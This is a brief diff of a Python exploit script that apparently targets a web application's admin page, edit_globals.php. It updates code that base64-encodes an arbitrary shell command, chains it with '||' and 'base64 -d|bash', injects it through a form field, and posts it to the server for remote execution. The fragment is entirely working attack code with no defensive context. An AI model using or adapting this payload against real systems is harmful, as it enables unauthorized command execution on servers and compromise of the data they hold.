@@ -134,8 +134,9 @@ with requests.session() as s:
       p.update({a[0]: a[1]})
 
     # Linux only, but can be easily modified for Windows.
-    _cmd = "|| echo " + base64.b64encode(args.cmd) + "|base64 -d|bash"
-    p.update({"form_284": _cmd})
+    if args.cmd != "clear":
+      _cmd = b"|| echo " + base64.b64encode(args.cmd.encode()) + b"|base64 -d|bash"
+      p.update({"form_284": _cmd})
 
     print(load + "Injecting payload")
     s.post(args.host + "/interface/super/edit_globals.php", data=p)
